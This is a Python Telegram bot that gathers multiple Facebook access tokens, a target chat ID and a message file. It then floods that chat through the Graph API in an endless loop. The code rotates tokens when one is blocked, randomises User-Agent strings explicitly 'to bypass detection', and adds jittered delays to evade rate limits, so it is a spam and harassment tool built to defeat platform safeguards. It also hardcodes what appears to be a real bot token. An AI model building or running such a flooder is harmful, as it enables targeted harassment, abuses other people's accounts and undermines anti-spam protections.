import requests
import threading
import logging
import random
import time
from queue import Queue
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7635741820:AAGAks8tA7qTJb5W6lSOpE1uMqG2Y9POvdg"

# Logging setup
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# Conversation states
TOKEN_COUNT, GET_TOKENS, CHAT_ID, MESSAGE_FILE = range(4)

# Global variable to track sending status
is_sending_active = True

# User-Agent list to bypass detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
]

# Queue to manage message sending
message_queue = Queue()

# Function to send messages using Facebook API
def send_facebook_message(access_token, chat_id, message):
    url = f"https://graph.facebook.com/v15.0/t_{chat_id}/"
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"access_token": access_token, "message": message}

    response = requests.post(url, json=payload, headers=headers)
    return response.ok

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = True
    await update.message.reply_text("🤖 How many Facebook tokens do you want to use?")
    return TOKEN_COUNT

# Stop command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active
    is_sending_active = False
    await update.message.reply_text("🛑 Stopping message sending.")
    return ConversationHandler.END

# Get token count
async def get_token_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        token_count = int(update.message.text)
        if token_count < 1:
            raise ValueError
        context.user_data["token_count"] = token_count
        context.user_data["tokens"] = []
        await update.message.reply_text(f"✅ Send {token_count} tokens one by one.")
        return GET_TOKENS
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number (1 or more).")
        return TOKEN_COUNT

# Collect tokens
async def get_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["tokens"].append(update.message.text)

    if len(context.user_data["tokens"]) < context.user_data["token_count"]:
        await update.message.reply_text(f"✅ Token {len(context.user_data['tokens'])} saved. Send the next one.")
        return GET_TOKENS
    
    await update.message.reply_text("✅ All tokens saved! Now enter the **Facebook Chat ID**:")
    return CHAT_ID

# Get chat ID
async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["chat_id"] = update.message.text
    await update.message.reply_text("✅ Chat ID saved! Now upload a **message file (.txt)**:")
    return MESSAGE_FILE

# Receive message file
async def receive_message_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    new_file = await context.bot.get_file(file.file_id)
    file_path = f'./{file.file_name}'
    await new_file.download_to_drive(file_path)

    context.user_data["file_path"] = file_path
    await update.message.reply_text("✅ Message file uploaded! Type /send to start.")
    return ConversationHandler.END

# Function to manage sending messages
def send_messages_worker(tokens, chat_id):
    token_index = 0

    while is_sending_active:
        if message_queue.empty():
            logging.info("✅ All messages sent! Restarting...")
            time.sleep(3)  # Short delay before restarting
            load_messages_into_queue()  # Reload messages into queue
            continue

        message = message_queue.get()
        current_token = tokens[token_index]

        success = send_facebook_message(current_token, chat_id, message)

        if success:
            logging.info(f"✅ Sent: {message} (Token {token_index + 1})")
            time.sleep(random.uniform(0.5, 1.5))  # Randomized delay
        else:
            logging.warning(f"⚠️ Blocked (Token {token_index + 1}), switching token")
            time.sleep(random.uniform(3, 5))  # Longer wait before retrying

        token_index = (token_index + 1) % len(tokens)  # Rotate tokens

# Load messages into queue
def load_messages_into_queue():
    global message_queue
    message_queue = Queue()  # Reset the queue

    try:
        with open(global_file_path, "r") as f:
            messages = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        logging.error("❌ Could not read the message file!")
        return

    for msg in messages:
        message_queue.put(msg)

# Send messages command
async def send_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_sending_active, global_file_path

    tokens = context.user_data.get("tokens", [])
    chat_id = context.user_data.get("chat_id")
    file_path = context.user_data.get("file_path")

    if not tokens or not chat_id or not file_path:
        await update.message.reply_text("❌ Missing token, chat ID, or message file.")
        return

    global_file_path = file_path  # Store file path globally for restarting

    load_messages_into_queue()  # Load messages into queue

    # Start a few worker threads to send messages efficiently
    thread_count = min(len(tokens), 3)  # Up to 3 worker threads
    for _ in range(thread_count):
        threading.Thread(target=send_messages_worker, args=(tokens, chat_id), daemon=True).start()

    await update.message.reply_text("🚀 Messages are being sent efficiently while avoiding blocking!")
    return ConversationHandler.END

# Telegram bot setup
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token_count)],
            GET_TOKENS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tokens)],
            CHAT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chat_id)],
            MESSAGE_FILE: [MessageHandler(filters.Document.ALL, receive_message_file)]
        },
        fallbacks=[]
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("send", send_message))

    app.run_polling()

if __name__ == "__main__":
    main()
